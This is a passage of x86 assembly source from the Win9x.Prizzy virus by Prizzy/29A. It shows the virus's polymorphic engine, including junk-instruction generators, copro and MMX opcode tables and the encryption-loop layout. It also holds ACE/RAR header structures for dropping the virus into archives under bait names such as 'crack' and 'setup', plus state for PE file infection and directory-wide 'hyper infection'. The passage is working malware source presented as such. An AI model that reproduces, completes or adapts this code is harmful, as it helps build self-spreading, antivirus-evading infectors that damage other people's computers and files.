   ;ÄÄÄ´ function to add/sub/mov with copro/mmx reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;This is my one of the last function which I wrote. So,
           ;the function which you see can generate ADD/SUB/MOV
           ;instruction to MMX or Copro by this example:
           ;
           ;   JNZ    NO_MMX
           ;   PADDD/PSUBD/MOVD...
           ;   JMP    COPRO_END
           ; NO_MMX:
           ;   FIADD/FISUB/FILD...
           ; COPRO_END:
           ;
           ;I can't add-sub with copro/mmx directly value because
           ;copro/mmx don't support it.
           ;
           ;input:        AX= (AH=reg32, AL=mmX)
           ;          BH= (0 =to, 1=from - only for MOV)
           ;          BL= add/sub/mov ? (0=ADD,1=SUB,2=MOV)
           ;
           __ppe_me_regs   dw  ?   ;input registers
           __ppe_me_oper   db  ?   ;input operation
           __ppe_me_tofrom db  ?   ;MOV: to, from
           __ppe_in_memory dd  ?   ;value in memory
           ;
   ppe_math_extended:

           pusha
           mov [ebp+__ppe_me_regs-virus_start],ax
           mov [ebp+__ppe_me_oper-virus_start],bl
           mov [ebp+__ppe_me_tofrom-virus_start],bh
           call    gen_garbage_based

           ; test if we far (only because of copro)
           call    __gr_where_in_mem
           jc  a_math_extended

           ; support MMX - the first test + JNZ
           mov al,0
           call    __mmx_test_start

           ; now, we will generate add-sub for MMX
           call    gen_garbage_based
           mov ax,[ebp+__ppe_me_regs-virus_start]
           mov bl,[ebp+__ppe_me_oper-virus_start]
           cmp bl,2            ;is it MOV ?
           jz  __ppe_me_move
           call    __mmx_add_sub
           jmp __ppe_me_finish
       __ppe_me_move:
           cmp byte ptr [ebp+__ppe_me_tofrom-virus_start],0
           jnz __ppe_me_move_from
           call    __mmx_movin
           jmp __ppe_me_finish
       __ppe_me_move_from:
           call    __mmx_movout

       __ppe_me_finish:
           call    gen_garbage_based

           ; save the memory place where we're for the future calculate
           push    edi
           add edi,5

           ; now, we will generate add-sub for Copro
           call    __mmx_test_finish
           call    gen_garbage_based

           ; I must get a empty place in memory to save reg32 there
           cmp byte ptr [ebp+__ppe_me_tofrom-virus_start],1
           jz  __ppe_me_noreg
           mov ah,[ebp+__ppe_me_regs-virus_start+1]
           call    ppe_reg2mem
           mov [ebp+__ppe_in_memory-virus_start],edx
       __ppe_me_noreg:

           ; and now - put iluzo-reg32 to copro-reg
           mov ax ,[ebp+__ppe_me_regs-virus_start]
           mov edx,[ebp+__ppe_in_memory-virus_start]
           lea esi,[ebp+tbl_copro_math+02h-virus_start]
           cmp byte ptr [ebp+__ppe_me_oper-virus_start],1
           jnz __ppe_me_nosub
           lea esi,[ebp+tbl_copro_math+06h-virus_start]
       __ppe_me_nosub:
           cmp byte ptr [ebp+__ppe_me_oper-virus_start],2
           jz  __ppe_me_move_2
           call    c_copro_math
           jmp __ppe_me_finish_2
       __ppe_me_move_2:
           cmp byte ptr [ebp+__ppe_me_tofrom-virus_start],0
           jnz __ppe_me_move_from_2
           lea esi,[ebp+tbl_copro_movin+03h-virus_start]
           call    c_copro_movin
           jmp __ppe_me_finish_2
       __ppe_me_move_from_2:
           mov ax,[ebp+__ppe_me_regs-virus_start]
           call    __copro_mov2reg

       __ppe_me_finish_2:
           ; set jump from MMX behind Copro
           mov eax,edi
           pop ebx         ;EDI from Copro
           sub eax,ebx
           sub eax,5
           mov [ebx+1],eax
           mov byte ptr [ebx],0E9h ;jmp..

   a_math_extended:
           mov [esp],edi
           popa
           ret

   ;ÄÄÄ´ function to put base-reg32 to memory ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;
           ;input:        AH=reg32
           ;output:      EDX=place in memory
           ;
           __ppe_mc_reg32  db  ?
           __ppe_mc_memory dd  ?
           ;
   ppe_reg2mem:
           ; save registers
           pusha
           mov byte ptr [ebp+__ppe_mc_reg32-virus_start],ah

           ; save used_regs
           mov al,byte ptr [ebp+used_regs-virus_start]
           push    ax

           mov al,[ebp+__ppe_mc_reg32-virus_start]
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah

           ; select place in memory
           call    __copro_get_mem     ;EDX is output
           mov [ebp+__ppe_mc_memory-virus_start],edx
       __ppe_r2m_new_reg:
           call    ppe_get_empty_reg
           test    byte ptr [ebx+REG_FLAGS],REG_NO_COPRO
           jnz __ppe_r2m_new_reg
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           mov bl,al
           mov eax,edx
           call    ppe_crypt_value
           movzx   ebx,bl
           lea ebx,[ebp+tbl_regs+ebx*02h-virus_start]
           call    __copro_fix_delta
           call    gen_garbage_based

           ; it's time for save reg32 to memory
           mov ah,[ebp+__ppe_mc_reg32-virus_start]
           shl ah,3
           or  ah,byte ptr [ebx]
           mov al,89h
           stosw               ;mov [empty_reg32], reg32
           call    gen_garbage_based

           ; enable register
           pop ax
           mov [ebp+used_regs-virus_start],al

           mov edx,[ebp+__ppe_mc_memory-virus_start]
           mov [esp].access_edx,edx
           mov [esp],edi
           popa
           ret

   ;ÄÄÄ´ function for write insignificant data ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ppe_gen_rnd_block:
           mov eax,20
           call    ppe_get_rnd_range
           add eax,5
           mov ecx,eax

   ppe_gen_rnd_fill:
           cld
           movzx   eax,byte ptr [ebp+compare_index-virus_start]
           cmp eax,5
           jae ppe_gen_rnd_loop
           push    ebx
           mov ebx,eax
           mov eax,ecx
           sub eax,4           ;far JMP's five bytes - 1
           call    ppe_get_rnd_range
           add eax,edi
           sub eax,[ebp+poly_start-virus_start]
           mov [ebp+compare_buffer+ebx*04h-virus_start],eax
           inc byte ptr [ebp+compare_index-virus_start]
           pop ebx
   ppe_gen_rnd_loop:
           call    ppe_get_rnd32
           stosb
           loop    ppe_gen_rnd_loop
           ret

   ;ÄÄÄ´ functions returns (empty) base/mmx/copro reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ppe_get_reg:    mov eax,00000008h
           call    ppe_get_rnd_range
           lea ebx,dword ptr [ebp+tbl_regs+eax*02h-virus_start]
           ret

   ppe_get_empty_reg:
           call    ppe_get_reg
           test    byte ptr [ebx+REG_FLAGS],REG_IS_STACK
           jnz ppe_get_empty_reg
           call    __reg_to_bcd
           test    [ebp+used_regs-virus_start],ah
           jnz ppe_get_empty_reg
           movzx   ax,al
           ret

   ppe_get_empty_reg_copro:
           call    ppe_get_reg
           call    __reg_to_bcd
           test    [ebp+used_regs_copro-virus_start],ah
           jnz ppe_get_empty_reg_copro
           movzx   ax,al
           ret

   ppe_get_empty_reg_mmx:
           call    ppe_get_reg
           call    __reg_to_bcd
           test    [ebp+used_regs_mmx-virus_start],ah
           jnz ppe_get_empty_reg_mmx
           movzx   ax,al
           ret

       __reg_to_bcd:
           push    ebx
           movzx   ebx,al
           movzx   ebx,byte ptr [ebp+tbl_regs_bcd+ebx-virus_start]
           mov ah,bl
           pop ebx
           ret

   ;ÄÄÄ´ function to detect/set an empty reg from base/copro/mmx ÃÄÄÄÄÄÄÄÄÄÄÄ
           ; output: AH=reg, AL=type
   ppe_get_valid_reg:
           push    ecx
       __ppes_new_reg_1:
           mov eax,00000003h
           call    ppe_get_rnd_range
           mov cl,al
           or  cl,cl
           jz  __ppes_new_reg_2
           mov cl,[ebp+copro_or_mmx-virus_start]
           inc cl
       __ppes_new_reg_2:
           or  cl,cl
           jnz __ppes_new_reg_extended
           call    ppe_get_empty_reg
           test    byte ptr [ebx+REG_FLAGS],REG_IS_STACK
           jnz __ppes_new_reg_2
           jmp __ppes_new_reg_finish
       __ppes_new_reg_extended:
           cmp cl,1
           jnz __ppes_new_reg_extended_mmx
           call    ppe_get_empty_reg_copro
           jmp __ppes_new_reg_finish
       __ppes_new_reg_extended_mmx:
           call    ppe_get_empty_reg_mmx
       __ppes_new_reg_finish:
           mov ah,byte ptr [ebx]
           mov al,cl
           pop ecx
           ret

   ppe_set_valid_reg:
           push    eax
           xchg    ah,al           ;input: AL = (base/copro/mmx)
           cmp ah,2            ;   AH = reg
           jz  __ppe_svr_mmx
           cmp ah,1            ;this function disable reg
           jz  __ppe_svr_copro     ;from b/c/m to the next use

           ; disable b-reg32
           call    __reg_to_bcd
           or  byte ptr [ebp+used_regs-virus_start],ah
           jmp __ppe_svr_finish
       __ppe_svr_copro:
           call    __reg_to_bcd
           or  byte ptr [ebp+used_regs_copro-virus_start],ah
           or  byte ptr [ebp+used_regs_mmx  -virus_start],ah
           jmp __ppe_svr_finish
       __ppe_svr_mmx:
           call    __reg_to_bcd
           or  byte ptr [ebp+used_regs_mmx  -virus_start],ah
           or  byte ptr [ebp+used_regs_copro-virus_start],ah

       __ppe_svr_finish:
           pop eax
           ret

   ;ÄÄÄ´ random numbers ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ppe_get_rnd32:  push    ebx
           mov ebx,dword ptr [ebp+rnd_last-virus_start]
           in  al,40h
           xor bl,al
           in  al,41h
           add bh,al
           rol ebx,13
           in  al,41h
           xor bl,al
           in  al,42h
           sub bh,al
           rol ebx,11
           xor ebx,eax
           xor ebx,ecx
           xor ebx,edx
           xor ebx,esp
           xor ebx,esi
           xor ebx,edi
           xor ebx,ebp
           mov dword ptr [ebp+rnd_last-virus_start],ebx
           mov eax,ebx
           pop ebx
           ret

   ppe_get_rnd_range:
           push    ecx edx
           mov ecx,eax
           call    ppe_get_rnd32
           xor edx,edx
           div ecx
           mov eax,edx
           pop edx ecx
           ret

   ;ÄÄÄ´ polymorphic tables ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ; some equ's needed by Prizzy Polymorphic Engine (PPE)

   REG_NO_8BIT equ 1           ;esi,edi,ebp aren't 8bit
   REG_IS_STACK    equ 2           ;reg is stack because of mmx, copro
   REG_NO_COPRO    equ 4           ;reg isn't suited for copro

   REG_FLAGS   equ 1           ;one byte to set tbl_regs' flags

   USED_MEMORY equ 30          ;we must be far then 30 bytes in poly

   USED_BASED  equ 1           ;don't generate copro & mmx
   USED_FLAGS  equ 2           ;generated garbages can't modify flags
   USED_COPRO  equ 4           ;don't generate copro garbage (needed if we're moving copro-reg)
   USED_MMX    equ 8           ;don't generate  mmx  garbage

           ; table of registers
           ; DO NOT modify this table or the next because they're
           ; dependent on - because of tranfer to reg_bcd

   tbl_regs    equ this byte
           db  00000000b,00h       ;eax
           db  00000001b,00h       ;ecx
           db  00000010b,00h       ;edx
           db  00000011b,00h       ;ebx
           db  00000100b,REG_IS_STACK+\
                     REG_NO_COPRO  ;esp
           db  00000101b,REG_NO_8BIT+\
                     REG_NO_COPRO  ;ebp
           db  00000110b,REG_NO_8BIT   ;esi
           db  00000111b,REG_NO_8BIT   ;edi
   end_regs    equ this byte

           ; table for use registers, DO NOT modify or move

   tbl_regs_bcd    equ this byte
           db  00000001b       ;eax, mm0, st(0)
           db  00000010b       ;ecx, mm1, st(1)
           db  00000100b       ;edx, mm2, st(2)
           db  00001000b       ;ebx, mm3, st(3)
           db  00010000b       ;esp, mm4, st(4)
           db  00100000b       ;ebp, mm5, st(5)
           db  01000000b       ;esi, mm6, st(4)
           db  10000000b       ;edi, mm7, st(7)
   end_regs_bcd    equ this byte

           ; opcodes for math reg,imm

   tbl_math_imm    equ this byte
           db  0C0h            ;add
           db  0C8h            ;or
           db  0E0h            ;and
           db  0E8h            ;sub
           db  0F0h            ;xor
           db  0D0h            ;adc
           db  0D8h            ;sbb
   end_math_imm    equ this byte

           ; opcodes for math reg,reg

   tbl_math_reg    equ this byte
           db  03h         ;add
           db  0Bh         ;or
           db  13h         ;adc
           db  1Bh         ;sbb
           db  23h         ;and
           db  2Bh         ;sub
           db  33h         ;xor
   end_math_reg    equ this byte

           ; one byte insctructions that doesn't modify reg

   tbl_save_code   equ this byte
           clc
           stc
           cmc
           cld
           std
   end_save_code   equ this byte

           ; opcodes for rotate/shift reg,imm

   tbl_rs_imm  equ this byte
           db  0C0h            ;rol
           db  0C8h            ;ror
           db  0D0h            ;rcl
           db  0D8h            ;rcr
           db  0E0h            ;shl
           db  0E8h            ;shr
           db  0F8h            ;sar
   end_rs_imm  equ this byte

           ; opcodes for bit tests reg,imm

   tbl_bt_imm  equ this byte
           db  0E0h, 0E8h, 0F0h, 0F8h  ;bt, bts, btr, btc
   end_bt_imm  equ this byte

           ; opcodes for bit tests reg,reg

   tbl_bt_reg  equ this byte
           db  0A3h, 0ABh, 0B3h, 0BBh  ;bt, bts, btr btc
   end_bt_reg  equ this byte

           ; opcodes for generate defined number
           ; decode_instruction = encode_instruction + 1st_number
           ; reg32 = 2nd_number + defined_reg32
           ; immX  = 3rd_number * 8

   tbl_num_code    equ this byte
           db  003h,081h,0C0h,04h  ;add (reg32), imm32
           db  0FBh,081h,0E8h,04h  ;sub (reg32), imm32
           db  0FFh,081h,0F0h,04h  ;xor (reg32), imm32
           db  003h,0C1h,0C0h,01h  ;rol (reg32), imm8
           db  0FBh,0C1h,0C8h,01h  ;ror (reg32), imm8
           db  0FFh,0F7h,0D0h,00h  ;not (reg32)
   end_num_code    equ this byte

           ; table of rep/repnz operations

   tbl_repeat  equ this byte
           dd  offset __gr_cmps    ;compare mem operand
           dd  offset __gr_lods    ;load mem operand
           dd  offset __gr_stos    ;store mem data
           dd  offset __gr_scas    ;scan mem
           dd  offset __gr_movs    ;move data from mem to mem
   end_repeat  equ this byte

           ; table of iluzo returns

   tbl_iluzo_ret   equ this byte
           dd  offset __iluzo_return_1, offset __iluzo_return_2
           dd  offset __iluzo_return_3, offset __iluzo_return_4
           dd  offset __iluzo_return_5, offset __iluzo_return_6
           dd  offset __iluzo_return_7, offset __iluzo_return_8
           dd  offset __iluzo_return_9
   end_iluzo_ret   equ this byte

           ; table of instructions to save any value to copro-reg
           ; the first value means if we must modify reg in instruction

   tbl_copro_movin equ this byte
           db  01h,0DFh,00h        ;FILD  word ptr
           db  01h,0DBh,00h        ;FILD dword ptr
           db  01h,0DFh,28h        ;FILD qword ptr
           db  01h,0D9h,00h        ;FLD  dword ptr
           db  01h,0DDh,00h        ;FLD  qword ptr
           db  00h,0D9h,0E8h       ;FLD1
           db  00h,0D9h,0E9h       ;FLDL2T
           db  00h,0D9h,0EAh       ;FLDL2E
           db  00h,0D9h,0EBh       ;FLDPI
           db  00h,0D9h,0ECh       ;FLDLG2
           db  00h,0D9h,0EDh       ;FLDLN2
           db  00h,0D9h,0EEh       ;FLDZ
   end_copro_movin equ this byte

           ; tables of instructions to load any value from copro-reg

   tbl_copro_movout equ    this byte
           db  0DFh,10h        ;FIST  word ptr
           db  0DBh,10h        ;FIST dword ptr
           db  0D9h,10h        ;FST  dword ptr
           db  0DDh,10h        ;FST  qword ptr
   end_copro_movout equ    this byte

           ; table of basic instructions for copro-math

   tbl_copro_math  equ this byte
           db  0DEh,00h        ;FIADD  word ptr
           db  0DAh,00h        ;FIADD dword ptr
           db  0DEh,20h        ;FISUB  word ptr
           db  0DAh,20h        ;FISUB dword ptr
           db  0D8h,00h        ;FADD  dword ptr
           db  0DCh,00h        ;FADD  qword ptr
           db  0D8h,20h        ;FSUB  dword ptr
           db  0DCh,20h        ;FSUB  qword ptr
   end_copro_math  equ this byte

           ; table of the others instruction of copro
           ; FP(A)TAN, FSCALE rewrite ST and ST(1), they're not here

   tbl_copro_others equ    this byte
           db  00h,0D9h,0FEh       ;FSIN
           db  00h,0D9h,0FFh       ;FCOS
           db  00h,0D9h,0FBh       ;FSINCOS
           db  00h,0D9h,0E1h       ;FABS
           db  00h,0D9h,0E0h       ;FCHS
           db  00h,0D9h,0FAh       ;FSQRT
           db  00h,0D9h,0FCh       ;FRNDINT
           db  00h,0D9h,0D0h       ;FNOP
           db  00h,0D9h,0E4h       ;FTST
           db  00h,0D9h,0E5h       ;FXAM
           db  01h,0DDh,0C0h       ;FFREE ST(x)
   end_copro_others equ    this byte

           ; table of the others MMX instructions

   tbl_mmx_others  equ this byte
           db  6Eh,6Fh         ;MOVD, MOVQ
           db  6Bh,63h,67h     ;PACKSSDW, PACKSSWB, PACKUSWB
           db  68h,6Ah,69h     ;PUNPCKHBW, PUNPCKHDQ, PUNPCKHWD
           db  60h,62h,61h     ;PUNPCKLBW, PUNPCKLDQ, PUNPCKLWD
           db  74h,76h,75h     ;PCMPEQB, PCMPEQD, PCMPEQW
           db  64h,66h,65h     ;PCMPGTB, PCMPGTD, PCMPGTW
           db  0D1h,0D2h,0D3h      ;PSRLW, PSRLD, PSRRLQ
           db  0E1h,0E2h       ;PSRAW, PSRAD
           db  0F1h,0F2h,0F3h      ;PSLLW, PSLLD, PSSLQ
           db  0DBh,0Dfh,0EBh,0EFh ;PAND, PANDN, POR, PXOR
           db  0D5h,0E5h,0F5h      ;PMULLW, PMULHW, PMADDWD
           db  0FCh,0FDh,0FEh      ;PADDB, PADDW, PADDD
           db  0ECh,0EDh,0DCh,0DDh ;PADDSB, PADDSW, PADDUSB, PADDUSW
           db  0F8h,0F9h,0FAh      ;PSUBB, PSUBW, PSUBD
           db  0E8h,0E9h,0D8h,0D9h ;PSUBSB, PSUBSW, PSUBUSB, PSUBUSW
   end_mmx_others  equ this byte

           ; table of encode-loop
           ; the first  value means - count
           ; the second value means - random select ?
           ; the third  value means - already generated ?

   tbl_encode_loop equ this byte
           db  02h, 01h
           dd  00000000h, offset ppe_get_cpuid_mmx
           dd  00000000h, offset ppe_copro_mmx_clear
           db  02h, 00h
           dd  00000000h, offset ppe_get_delta
           dd  00000000h, offset ppe_encode_one
           db  03h, 00h
           dd  00000000h, offset ppe_get_index
           dd  00000000h, offset ppe_get_code
           dd  00000000h, offset ppe_get_counter
           db  01h, 01h
           dd  00000000h, offset ppe_decoder
           db  03h, 00h
           dd  00000000h, offset ppe_get_next_index
           dd  00000000h, offset ppe_get_next_code
           dd  00000000h, offset ppe_get_next_counter
           db  02h, 01h
           dd  00000000h, offset ppe_get_exloop
           dd  00000000h, offset ppe_get_return
   end_encode_loop equ this byte

           ; table of the instructions which they don't modify flags
           ; 1st value = move to original instructions
           ; 2nd value = how many garbages don't modify flags

   tbl_no_flags    equ this byte
           db  06h, (__no_flags_1 - tbl_garbage) / 04h
           db  06h, (__no_flags_2 - tbl_garbage) / 04h
   end_no_flags    equ this byte

           ; hyper table of garbages (support MMX and Copro), wow !
           ; where __no_flags_X means the following garbages don't
           ; modify any flags, do NOT modify this table 'cause of flags

   tbl_garbage equ this byte
           dd  offset g_push_g_pop ;push reg/garbage/pop reg
      __no_flags_1:dd  offset g_movreg32imm    ;mov reg32,imm
           dd  offset g_movreg16imm    ;mov reg16,imm
           dd  offset g_movreg8imm ;mov reg8,imm
           dd  offset g_movregreg32    ;mov reg32,reg32
           dd  offset g_movregreg16    ;mov reg16,reg16
           dd  offset g_movregreg8 ;mov reg8,reg8
           dd  offset g_mathreg32imm   ;math reg32,imm
           dd  offset g_mathreg16imm   ;math reg16,imm
           dd  offset g_mathreg8imm    ;math reg8,imm
      __no_flags_2:dd  offset g_call_cont  ;call/garbage/pop
           dd  offset g_jump_u     ;jump/rnd data
           dd  offset g_jump_c     ;jump conditional/garbage
           dd  offset g_movzx_movsx_32 ;movzx/movsx reg32,reg16

           dd  offset g_movzx_movsx_16 ;movzx/movsx reg16,reg8
           dd  offset g_movzx_movsx_8  ;movzx/movsx reg32,reg8
           dd  offset g_rotate_shift32 ;(rcr,sal...) reg32,imm8
           dd  offset g_rotate_shift16 ;(ror,shl...) reg16,imm8
           dd  offset g_rotate_shift8  ;(rol,shr...) reg8,imm8
           dd  offset g_rs_reg32reg8   ;(rcr,sal...) reg32,reg8
           dd  offset g_rs_reg16reg8   ;(ror,shl...) reg16,reg8
           dd  offset g_rs_reg8reg8    ;(rol,shr...) reg8,reg8
           dd  offset g_bit_test32 ;(bsf,bsr...) reg32,imm8
           dd  offset g_bit_test16 ;(btc,bts...) reg16,imm8
           dd  offset g_bt_regreg32    ;(bsf,bsr...) reg32,reg32
           dd  offset g_bt_regreg16    ;(btc,bts...) reg16,reg16
           dd  offset g_mathregreg32   ;(add,sub...) reg32,reg32
           dd  offset g_mathregreg16   ;(xor,and...) reg16,reg16
           dd  offset g_mathregreg8    ;(sbb,adc...) reg8,reg8
           dd  offset g_set_byte   ;(seta,setp.) reg8
           dd  offset g_loop       ;garbage/(loope/loopnz...)
           dd  offset g_loop_jump  ;garbage/(dec reg8/16/32, jnz)
           dd  offset g_call_reg32 ;gen reg32/call reg32/rndblock/pop reg32
           dd  offset g_jump_reg32 ;gen reg32/jump reg32/rndblock
           dd  offset g_repeat     ;gen regz/rep(lods,cmps...)
           dd  offset g_pushpop_value  ;push rnd(32/16)/garbage/pop reg32
           dd  offset g_crypt_value    ;crypt rnd32 value to reg32
           dd  offset g_compare    ;dec reg32/cmp r32,r32/jnz
           dd  offset g_iluzo_return   ;gen reg32/jmp reg32/-jmp offs-
       __garbage_copro:
           dd  offset g_copro_movin    ;(fld,fild,fldz...) w/d/q ptr [---]
           dd  offset g_copro_movout   ;(fst,fist...) w/d/q ptr [---]
           dd  offset g_copro_math ;(fadd,fsub...) (w/d)/(st(x),st)
           dd  offset g_copro_others   ;(fsin,fptan,fabs,fxch,ffree,..)
       __garbage_mmx:
           dd  offset g_mmx        ;fully 46 instructions !!
           dd  offset g_mmx        ;2nd use ('cause it's a
           dd  offset g_mmx        ;3rd use  great table)
   end_garbage equ this byte

   __garbage_based_num equ (offset __garbage_copro - offset tbl_garbage) / 04h
   __garbage_copro_num equ (offset __garbage_mmx   - offset __garbage_copro) / 04h
   __garbage_mmx_num   equ (offset end_garbage - offset __garbage_mmx) /04h

   ;ÄÄÄ´ archivez struct ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ACE_Archive     equ 0
   RAR_Archive     equ 1

   Archive_Err     equ 1
   Archive_NoErr       equ 0
   ACE_MagicSize       equ 7
   ACE_BeforeMagic     equ 7

   ACE_Magic       db  '**ACE**'   ;ACE signature

       Archive_MagicWhere:

   ACE_MagicWhere      dw  0,ACE_header_needed ;ACE archive (*.ACE)
               dw  05C00h,300h ;ACE-SFX (DOS)
               dw  0DE00h,2200h    ;ACE-SFX English/German
                           ;(Win 95/98, NT 4.x)

   RAR_MagicWhere      dw  0,20        ;RAR archive (*.RAR)
               dw  2400h,800h  ;RAR-SFX (DOS)
               dw  5000h,800h  ;RAR-SFX (Win 95/98, NT 4.x)

   ACE_file_length     equ ACEf_Filename-ACEf_HeadCRC
   ACE_header_needed   equ ACEh_Reserved1-ACEh_HeadCrc
   ACE_without_filename    equ ACEf_Filename-ACEf_HeadType

       ACE_header_start:

   ACEh_HeadCrc        dw  0       ;CRC of ACE header
   ACEh_HeadSize       dw  0       ;Header Size
   ACEh_HeadType       db  0
   ACEh_HeadFlags      dw  0       ;2048=mult_vol

   ACEh_Signature      db  7 dup (0)   ;if u'll write ace_magic_size instead -7-, tasm32 will down
   ACEh_VerMod     db  0
   ACEh_VerCr      db  0
   ACEh_HostCr     db  0
   ACEh_VolumeNumber   db  0       ;volume number of archive (ACE=0, C00=1...)
   ACEh_TimeDate       dd  0       ;Time&Date packed
   ACEh_Reserved1      dw  0
   ACEh_Reserved2      dw  0
   ACEh_Reserved3      dd  0
   ACEh_AvSize     db  0       ;internal comment
   ACEh_Av         equ ThisPlace
   ACEh_CommentSize    dw  0
   ACEh_Comment        equ ThisPlace

       ACE_file_start:

   ACEf_HeadCRC        dw  0
   ACEf_HeadSize       dw  0       ;i don't know 'cause ACEf_Filename isn't defined
   ACEf_HeadType       db  1
   ACEf_HeadFlags      dw  00008001h
   ACEf_CompressedSize dd  0       ;filesize in archive
   ACEf_UnCompressedSize   dd  0       ;filesize on your disk
   ACEf_TimeDate       dd  12345678h
   ACEf_Attrib     dd  00000020h
   ACEf_CRC32      dd  0       ;thx Vecna's CRC32 function
   ACEf_TechType       db  0       ;STORED=0, LZ1=1
   ACEf_TechQual       db  0
   ACEf_TechParm       dw  0
   ACEf_Reserved       dw  0
   ACEf_FilenameSize   dw  0       ;i don't know now
   ACEf_Filename       db  8+1+3 dup (0)   ;only short name we'll generate


   RAR_Magic       db  'Rar!',1Ah,7,0
   RAR_MagicSize       equ 7

   RAR_file_length     equ RAR_Filename - RAR_HeaderCRC
   RAR_header_needed   equ RAR_CompressedSize - RAR_HeaderCRC
   RAR_without_filename    equ RAR_Filename - RAR_HeaderType

       RAR_header_start:

   RAR_HeaderCRC       dw  0000h
   RAR_HeaderType      db  74h     ;FILE_HEAD
   RAR_FileFlags       dw  08000h      ;if (1=mult_vol)
   RAR_HeaderSize      dw  0       ;i don't know 'cause RAR_FileName isn't defined
   RAR_CompressedSize  dd  0
   RAR_UnCompressedSize    dd  0
   RAR_HostOS      db  0       ;DOS=0, OS2=1, WIN_32=2, UNIX=3 - but i don't know now
   RAR_FileCRC     dd  0       ;haha, thx Vecna's CRC32 function
   RAR_TimeDate        dd  12345678h
   RAR_VersionNeed     db  14h
   RAR_Method      db  30h
   RAR_FilenameSize    dw  0       ;i don't know now
   RAR_FileAttribute   dd  00000020h
   RAR_Filename        db  8+1+3 dup (00h)

               ; kernel32's base address

   kernel_base     dd  00000000h   ;thx to z0mbie & Vecna
   gpa         db  'GetProcAddress',0
   pGetProcAddress     dd  00000000h   ;address of this function
   pGetDriveType       dd  00000000h   ;address of this function
   gdt_flags       dd  00000000h   ;fixed & remote disks

               ; dropper's name to ACE/RAR

   gen_archive_number  equ 9
   gen_archive_filename    db  0,7,'install', 0,5,'setup', 0,3,'run', \
                   0,5,'sound',   0,6,'config',0,4,'help', \
                   1,6,'gratis',  1,5,'crack', 1,6,'readme'

               db  13,10
   szAuthor        db  "Win9x.Prizzy - hyper infection, copro & mmx "
               db  "poly-engine, ACE/RAR dropper",13,10
               db  "(c)oded by Prizzy/29A, welcome to my world..."

           align   dword

   ;ÄÄÄ´ memory buffer which ain't in file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   file_end:

           ;work with filez

   filename_ptr    dd  00000000h   ;pointer to filename
   filename_size   equ 260     ;MAX_SIZE defined by M$
   filename    db  filename_size dup (00h)
   file_handle dd  00000000h   ;open file handle

           ;are we inside IFS ?

   in_ifs      db  00h     ;are we in IFS now ?
   last_idt    dq  0000000000000000h

           ;hyper infection

   search_filename db  filename_size dup (00h)
   search_finished db  00h     ;has hyper infection finished ?
   search_start    db  00h     ;have we begun yet ?
   search_address  dd  00000000h   ;address of dta's in memory
   search_plunge   db  00h     ;how many dirz we have in
   search_handle   dd  00000000h   ;FindFirstFile handle
   dta     dta_struc <00h>     ;main dta struc for search_handle

           ;structs of PE file

   mz_header   IMAGE_DOS_HEADER    <00h>   ;old EXE header
   pe_signature    dd  00000000h       ;'PE\0\0'
   pe_header   IMAGE_FILE_HEADER   <00h>   ;main header
   pe_optional IMAGE_OPTIONAL_HEADER   <00h>   ;advanced header
   pe_section  IMAGE_SECTION_HEADER    <00h>   ;sections of EXE's

   pe_actsection   dd  00000000h       ;last section

           ;archivez struc

   Archive_BufSize equ 65536           ;this is only for EXE-SFX 'cause there's self-EXE encrypt code

   Archive_Number  db  00h         ;search in XXX,XXX-SFX (DOS),XXX-SFX (Win32)
   Archive_Buffer  dd  00000000h       ;readed buffer to search XXX_Magic

   Archive_Filename_Sz dd  00000000h   ;file size of Archive_Filename
   Archive_Filename    db  filename_size dup(00h)

   file_in_mem dd  00000000h       ;where's file to calculate CRC32

           ;data used by Prizzy Polymorphic Engine (PPE)

   ppe_buf_start   equ this byte

   rnd_last    dd  00000000h       ;last number in get_rnd32 function
   garbage_style   db  00h         ;have I use unmodify flags instructions ?

   used_regs   db  00h         ;used eax,ecx,edx...
   used_regs_mmx   db  00h         ;used mm0,mm1...mm7
   used_regs_copro db  00h         ;used st(0),st(1)...st(7)
   gl_index_reg    db  00h         ;which reg is index ?

   mem_address dd  00000000h       ;where's copy of this virus
   poly_start  dd  00000000h       ;where poly decoder start
   poly_finish dd  00000000h       ;where poly decoder finish
   recursive_level db  00h         ;garbage recursive layer
   recursive_lmmx  db  00h         ;mmx recursive level
   copro_or_mmx    db  00h         ;index/code/counter in copro or mmx ?

   index_reg   db  00h         ;index_reg is in 0=base, 1=copro, 2=mmx
   index_reg_place db  00h         ;register in (base/copro/mmx)-reg
   index_reg_get   db  00h         ;getted index_reg ?
   counter_reg db  00h         ;counter_reg is in 0=base, 1=copro, 2=mmx
   counter_reg_place db    00h         ;register in (base/copro/mmx)-reg
   code_reg    db  00h         ;code_reg is in 0=base, 1=copro, 2=mmx
   code_reg_place  db  00h         ;register in (base/copro/mmx)-reg

   code_value  dd  00000000h       ;startup code value
   code_value_add  dd  00000000h       ;next_code = code + this_c
   crypt_style db  00h         ;(0=add/1=sub/2=xor) [---],reg32
   counter_value   dd  00000000h       ;startup counter value
   counter_vfinish dd  00000000h       ;finish counter value
   counter_back    dd  00000000h       ;address for JNZ jump

   compare_index   db  00h         ;where in <compare_buffer>
   compare_buffer  dd  5 dup(00000000h)    ;see <g_compare> for more infoz

   mem_end:

